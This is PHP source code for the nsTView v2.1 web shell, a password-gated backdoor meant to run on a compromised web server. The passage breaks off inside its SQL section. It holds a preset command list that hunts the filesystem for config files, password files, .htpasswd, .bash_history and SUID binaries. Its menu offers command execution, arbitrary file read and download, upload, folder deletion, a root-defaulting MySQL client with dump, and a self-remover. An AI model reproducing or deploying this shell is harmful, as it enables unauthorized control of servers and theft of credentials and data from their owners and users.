<?php

@session_start();

@set_time_limit(0);

@set_magic_quotes_runtime(0);

error_reporting(E_ALL & ~E_NOTICE);

#####cfg#####

# use password  true / false #

$create_password = true;

$password = "acdfe3f93a9351d6fe095440636d487d";    // default password for nstview, you can change it.



# UNIX COMMANDS

# description (nst) command

# example: Shutdown (nst) shutdown -h now

$fast_commands = "

Show open ports (nst) netstat -an | grep LISTEN | grep tcp

last root (nst) last root

last (all users) (nst) last all

Find all config.php in / (nst) find / -type f -name config.php

Find all config.php in . (nst) find . -type f -name config.php

Find all admin.php in / (nst) find / -type f -name admin.php

Find all admin.php in . (nst) find . -type f -name admin.php

Find all config.inc.php in / (nst) find / -type f -name config.inc.php

Find all config.inc.php in . (nst) find . -type f -name config.inc.php

Find all config.inc in / (nst) find / -type f -name config.inc

Find all config.inc in . (nst) find . -type f -name config.inc

Find all config.dat in / (nst) find / -type f -name config.dat

Find all config.dat in . (nst) find . -type f -name config.dat

Find all config* in / (nst) find / -type f -name config*

Find all config* in . (nst) find . -type f -name config*

Find all pass* in / (nst) find / -type f -name pass*

Find all pass* in . (nst) find . -type f -name pass*

Find all .bash_history in / (nst) find / -type f -name .bash_history

Find all .bash_history in . (nst) find . -type f -name .bash_history

Find all .htpasswd  in / (nst) find / -type f -name .htpasswd

Find all .htpasswd  in . (nst) find . -type f -name .htpasswd

Find all writable dirs/files in / (nst) find / -perm -2 -ls

Find all writable dirs/files in . (nst) find . -perm -2 -ls

Find all suid files in / (nst) find / -type f -perm -04000 -ls

Find all suid files in . (nst) find . -type f -perm -04000 -ls

Find all sgid files in / (nst) find / -type f -perm -02000 -ls

Find all sgid files in . (nst) find . -type f -perm -02000 -ls

Find all .fetchmailrc files in / (nst) find / -type f -name .fetchmailrc

Find all .fetchmailrc files in . (nst) find . -type f -name .fetchmailrc

OS Version? (nst) sysctl -a | grep version

Kernel version? (nst) cat /proc/version

cat syslog.conf (nst) cat /etc/syslog.conf

Cat - Message of the day (nst) cat /etc/motd

Cat hosts (nst) cat /etc/hosts

Distrib name (nst) cat /etc/issue.net

Distrib name (2) (nst) cat /etc/*-realise

Display all process - wide output (nst) ps auxw

Display all your process (nst) ps ux

Interfaces (nst) ifconfig

CPU? (nst) cat /proc/cpuinfo

RAM (nst) free -m

HDD space (nst) df -h

List of Attributes (nst) lsattr -a

Mount options (nst) cat /etc/fstab

Is cURL installed? (nst) which curl

Is wGET installed? (nst) which wget

Is lynx installed? (nst) which lynx

Is links installed? (nst) which links

Is fetch installed? (nst) which fetch

Is GET installed? (nst) which GET

Is perl installed? (nst) which perl

Where is apache (nst) whereis apache

Where is perl (nst) whereis perl

locate proftpd.conf (nst) locate proftpd.conf

locate httpd.conf (nst) locate httpd.conf

locate my.conf (nst) locate my.conf

locate psybnc.conf (nst) locate psybnc.conf

";







# WINDOWS COMMANDS

# description (nst) command

# example: Delete autoexec.bat (nst) del c:\autoexec.bat

$fast_commands_win = "

OS Version (nst) ver

Tasklist  (nst) tasklist

Attributes in . (nst) attrib

Show open ports (nst) netstat -an

";











######ver####

$ver= "v2.1";

#############

$pass=md5($_POST['pass']);

if($pass==$password){

$_SESSION['nst']="$pass";

}

if ($_SERVER["HTTP_CLIENT_IP"]) $ip = $_SERVER["HTTP_CLIENT_IP"];

else if($_SERVER["HTTP_X_FORWARDED_FOR"]) $ip = $_SERVER["HTTP_X_FORWARDED_FOR"];

else if($_SERVER["REMOTE_ADDR"]) $ip = $_SERVER["REMOTE_ADDR"];

else $ip = $_SERVER['REMOTE_ADDR'];

$ip=htmlspecialchars($ip);



if($create_password==true){



if(!isset($_SESSION['nst']) or $_SESSION['nst']!=$password){

die("

<title>nsTView $ver:: nst.void.ru</title>

<center>

<table width=100 bgcolor=#D7FFA8 border=1 bordercolor=black><tr><td>

<font size=1 face=verdana><center>

<b>nsTView $ver :: <a href=http://xhs.net.ru style='text-decoration:none;'><font color=black>nst.void.ru</font></a><br></b>

</center>

<form method=post>

Password:<br>

<input type=password name=pass size=30 tabindex=1>

</form>

<b>Host:</b> ".$_SERVER["HTTP_HOST"]."<br>

<b>IP:</b> ".gethostbyname($_SERVER["HTTP_HOST"])."<br>

<b>Your ip:</b> ".$ip."

</td></tr></table>


");}



}

$d=$_GET['d'];



function adds($editf){

#if(get_magic_quotes_gpc()==0){

$editf=addslashes($editf);

#}

return $editf;

}

function adds2($editf){

if(get_magic_quotes_gpc()==0){

$editf=addslashes($editf);

}

return $editf;

}



$f   = "nst_sql.txt";

$f_d = $_GET['f_d'];



if($_GET['download']){

$download=$_GET['download'];

header("Content-disposition: attachment; filename=\"$download\";");

readfile("$d/$download");

exit;}



if($_GET['dump_download']){

header("Content-disposition: attachment; filename=\"$f\";");

header("Content-length: ".filesize($f_d."/".$f));

header("Expires: 0");

readfile($f_d."/".$f);

if(is_writable($f_d."/".$f)){

unlink($f_d."/".$f);

}

die;

}





$images=array(".gif",".jpg",".png",".bmp",".jpeg");

$whereme=getcwd();

@$d=@$_GET['d'];

$copyr = "<center><a href=http://xhs.net.ru target=_blank>nsTView $ver<br>o... Nine security team ...o</a>";

$php_self=@$_SERVER['PHP_SELF'];

if(@eregi("/",$whereme)){$os="unix";}else{$os="win";}

if(!isset($d)){$d=$whereme;}

$d=str_replace("\\","/",$d);

if(@$_GET['p']=="info"){

@phpinfo();

exit;}

if(@$_GET['img']=="1"){

@$e=$_GET['e'];

header("Content-type: image/gif");

readfile("$d/$e");

}

if(@$_GET['getdb']=="1"){

header('Content-type: application/plain-text');

header('Content-Disposition: attachment; filename=nst-mysql-damp.htm');

}

print "<title>nsT View $ver</title>

<style>

BODY, TD, TR {

text-decoration: none;

font-family: Verdana;

font-size: 8pt;

SCROLLBAR-FACE-COLOR: #363d4e;

SCROLLBAR-HIGHLIGHT-COLOR: #363d4e;

SCROLLBAR-SHADOW-COLOR: #363d4e;

SCROLLBAR-ARROW-COLOR: #363d4e;

SCROLLBAR-TRACK-COLOR: #91AAFF

}

input, textarea, select {

font-family: Verdana;

font-size: 10px;

color: black;

background-color: white;

border: solid 1px;

border-color: black

}

UNKNOWN {

COLOR: #0006DE;

TEXT-DECORATION: none

}

A:link {

COLOR: #0006DE;

TEXT-DECORATION: none

}

A:hover {

COLOR: #FF0C0B;

TEXT-DECORATION: none

}

A:active {

COLOR: #0006DE;

TEXT-DECORATION: none

}

A:visited {

TEXT-DECORATION: none

}

</style>

<script>

function ShowOrHide(d1, d2) {

if (d1 != '') DoDiv(d1);

if (d2 != '') DoDiv(d2);}



function DoDiv(id) {

var item = null;

if (document.getElementById) {

item = document.getElementById(id);

} else if (document.all){

item = document.all[id];

} else if (document.layers){

item = document.layers[id];}

if (!item) {}

else if (item.style) {

if (item.style.display == \"none\"){ item.style.display = \"\"; }

else {item.style.display = \"none\"; }

}else{ item.visibility = \"show\"; }}



function cwd(text){

document.sh311Form.sh3.value+=\" \"+ text;

document.sh311Form.sh3.focus();

}





</script>

";

print "<body vlink=#0006DE>

<table width=600 border=0 cellpadding=0 cellspacing=1 bgcolor=#D7FFA8 align=center>

<tr><td><font face=wingdings size=2>0</font>";

$expl=explode("/",$d);

$coun=count($expl);

if($os=="unix"){echo "<a href='$php_self?d=/'>/</a>";}

else{

        echo "<a href='$php_self?d=$expl[0]'>$expl[0]/</a>";}

for($i=1; $i<$coun; $i++){

        @$xx.=$expl[$i]."/";

$sls="<a href='$php_self?d=$expl[0]/$xx'>$expl[$i]</a>/";

$sls=str_replace("//","/",$sls);

$sls=str_replace("/'></a>/","/'></a>",$sls);

print $sls;

}

if(@ini_get("register_globals")){$reg_g="ON";}else{$reg_g="OFF";}

if(@ini_get("safe_mode")){$safe_m="ON";}else{$safe_m="OFF";}

echo "</td></tr>";

if($os=="unix"){ echo "

<tr><td><b>id:</b> ".@exec('id')."</td></tr>

<tr><td><b>uname -a:</b> ".@exec('uname -a')."</td></tr>";} echo"

<tr><td><b>Your IP: [<font color=#5F3CC1>$ip</font>] Server IP: [<font color=#5F3CC1>".gethostbyname($_SERVER["HTTP_HOST"])."</font>] Server <a href=# title='Host.Domain'>H.D.</a>: [<font color=#5F3CC1>".$_SERVER["HTTP_HOST"]."</font>]</b><br>

[<b>Safe mode:</b> $safe_m] [<b>Register globals:</b> $reg_g]<br>

[<a href=# onClick=location.href=\"javascript:history.back(-1)\">Back</a>]

[<a href='$php_self'>Home</a>]

[<a href='$php_self?d=$d&sh311=1'>Shell (1)</a> <a href='$php_self?d=$d&sh311=2'>(2)</a>]

[<a href='$php_self?d=$d&t=upload'>Upload</a>]

[<a href='$php_self?t=tools'>Tools</a>]

[<a href='$php_self?p=info'>PHPinfo</a>]

[<a href='$php_self?delfolder=$d&d=$d&delfl=1&rback=$d' title='$d'>DEL Folder</a>]

[<a href='$php_self?p=sql'>SQL</a>]

[<a href='$php_self?p=selfremover'>Self Remover</a>]

</td></tr>

";

if($os=="win"){ echo "

<tr><td bgcolor=white>

<center><font face=wingdings size=2><</font>

<a href='$php_self?d=a:/'>A</a>

<a href='$php_self?d=b:/'>B</a>

<a href='$php_self?d=c:/'>C</a>

<a href='$php_self?d=d:/'>D</a>

<a href='$php_self?d=e:/'>E</a>

<a href='$php_self?d=f:/'>F</a>

<a href='$php_self?d=g:/'>G</a>

<a href='$php_self?d=h:/'>H</a>

<a href='$php_self?d=i:/'>I</a>

<a href='$php_self?d=j:/'>J</a>

<a href='$php_self?d=k:/'>K</a>

<a href='$php_self?d=l:/'>L</a>

<a href='$php_self?d=m:/'>M</a>

<a href='$php_self?d=n:/'>N</a>

<a href='$php_self?d=o:/'>O</a>

<a href='$php_self?d=p:/'>P</a>

<a href='$php_self?d=q:/'>Q</a>

<a href='$php_self?d=r:/'>R</a>

<a href='$php_self?d=s:/'>S</a>

<a href='$php_self?d=t:/'>T</a>

<a href='$php_self?d=u:/'>U</a>

<a href='$php_self?d=v:/'>V</a>

<a href='$php_self?d=w:/'>W</a>

<a href='$php_self?d=x:/'>X</a>

<a href='$php_self?d=y:/'>Y</a>

<a href='$php_self?d=z:/'>Z</a>

</td></tr>";}else{echo "<tr><td>&nbsp;</td></tr>";}

print "<tr><td>

:: <a href='$php_self?d=$d&mkdir=1'>Create folder</a> ::

<a href='$php_self?d=$d&mkfile=1'>Create file</a> ::

<a href='$php_self?d=$d&read_file_safe_mode=1'>Read file if safe mode is On</a> ::";

if($os=="unix"){

print "<a href='$php_self?d=$d&ps_table=1'>PS table</a> ::";

}

print "</td></tr>";











if($_GET['p']=="ftp"){

print "<tr><td>";







print "</td></tr></table>";

print $copyr;

exit;

}





















if(@$_GET['p']=="sql"){

print "<tr><td>";

###



$f_d = $_GET['f_d'];

if(!isset($f_d)){$f_d=".";}

if($f_d==""){$f_d=".";}



$php_self=$_SERVER['PHP_SELF'];

$delete_table=$_GET['delete_table'];

$tbl=$_GET['tbl'];

$from=$_GET['from'];

$to=$_GET['to'];

$adress=$_POST['adress'];

$port=$_POST['port'];

$login=$_POST['login'];

$pass=$_POST['pass'];

$adress=$_GET['adress'];

$port=$_GET['port'];

$login=$_GET['login'];

$pass=$_GET['pass'];

$conn=$_GET['conn'];

if(!isset($adress)){$adress="localhost";}

if(!isset($login)){$login="root";}

if(!isset($pass)){$pass="";}

if(!isset($port)){$port="3306";}

if(!isset($from)){$from=0;}

if(!isset($to)){$to=50;}





?>